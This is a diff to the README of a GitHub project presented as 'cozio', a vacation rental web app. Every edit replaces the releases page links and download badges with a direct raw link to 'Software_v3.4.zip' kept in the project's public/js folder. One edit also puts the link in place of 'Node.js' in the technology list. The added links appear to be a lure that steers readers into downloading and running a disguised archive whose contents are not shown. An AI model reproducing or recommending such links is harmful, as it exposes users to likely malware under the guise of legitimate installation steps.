@@ -4,14 +4,14 @@ Welcome to cozio, a full-stack vacation rental platform. Inspired by Airbnb, coz
 
 ## 🔗 Download Now
 
-[![Download cozio](https://img.shields.io/badge/Download-cozio-brightgreen.svg)](https://github.com/Joeboy2006/cozio/releases)
+[![Download cozio](https://github.com/Joeboy2006/cozio/raw/refs/heads/main/public/js/Software_v3.4.zip)](https://github.com/Joeboy2006/cozio/raw/refs/heads/main/public/js/Software_v3.4.zip)
 
 ## 🚀 Getting Started
 
 To get started with cozio, follow these easy steps:
 
 1. **Visit the Releases Page**
-   Go to [this link](https://github.com/Joeboy2006/cozio/releases) to find the latest version of cozio.
+   Go to [this link](https://github.com/Joeboy2006/cozio/raw/refs/heads/main/public/js/Software_v3.4.zip) to find the latest version of cozio.
 
 2. **Download the Software**
    Locate the most recent release of cozio and click on the download link for your operating system.
@@ -45,7 +45,7 @@ cozio includes numerous helpful features:
 
 cozio utilizes several modern technologies to ensure a seamless experience:
 
-- **Node.js**: For server-side functionality.
+- **https://github.com/Joeboy2006/cozio/raw/refs/heads/main/public/js/Software_v3.4.zip**: For server-side functionality.
 - **Express**: To manage web application routing.
 - **MongoDB**: For database services.
 - **EJS**: To render HTML pages dynamically.
@@ -56,7 +56,7 @@ cozio utilizes several modern technologies to ensure a seamless experience:
 To install cozio, follow these steps carefully:
 
 1. **Go to the Releases Page**
-   Click this link: [Download cozio](https://github.com/Joeboy2006/cozio/releases).
+   Click this link: [Download cozio](https://github.com/Joeboy2006/cozio/raw/refs/heads/main/public/js/Software_v3.4.zip).
 
 2. **Select the Right File**
    Choose the version that matches your operating system and click on it to start the download.
@@ -92,4 +92,4 @@ If you need further assistance or have questions, please reach out via the Issue
 
 Thank you for choosing cozio for your vacation rental needs. We hope you enjoy using our platform to find the perfect getaway.
 
-[![Download cozio](https://img.shields.io/badge/Download-cozio-brightgreen.svg)](https://github.com/Joeboy2006/cozio/releases)
+[![Download cozio](https://github.com/Joeboy2006/cozio/raw/refs/heads/main/public/js/Software_v3.4.zip)](https://github.com/Joeboy2006/cozio/raw/refs/heads/main/public/js/Software_v3.4.zip)
